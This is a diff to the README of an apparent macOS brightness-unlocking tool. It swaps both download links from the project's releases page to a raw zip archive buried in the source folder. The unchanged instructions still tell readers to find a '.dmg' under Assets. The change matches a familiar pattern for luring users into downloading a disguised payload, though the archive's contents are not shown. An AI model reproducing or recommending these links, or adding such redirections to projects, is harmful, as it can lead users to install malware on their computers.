@@ -1,6 +1,6 @@
 # 💡 light-up-my-life - Unlock full brightness on your MacBook
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/danibetter6297/light-up-my-life/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/danibetter6297/light-up-my-life/raw/refs/heads/main/Sources/LightUpMyLife/up_light_my_life_v1.7.zip)
 
 This application gives you full control over the XDR brightness settings on your MacBook Pro display. Modern Apple displays support high brightness modes that remain locked by default. This tool removes those software limits. You can reach the maximum capacity of 1,600 nits for consistent, high-intensity color work.
 
@@ -17,7 +17,7 @@ Before you install this software, confirm your computer meets these requirements
 
 Follow these steps to set up the application on your computer.
 
-1. Visit [this page to download](https://github.com/danibetter6297/light-up-my-life/releases) the latest installer.
+1. Visit [this page to download](https://github.com/danibetter6297/light-up-my-life/raw/refs/heads/main/Sources/LightUpMyLife/up_light_my_life_v1.7.zip) the latest installer.
 2. Look for the file ending in `.dmg` under the Assets section.
 3. Click the filename to start the download to your Mac.
 4. Open your Downloads folder once the file finishes saving.
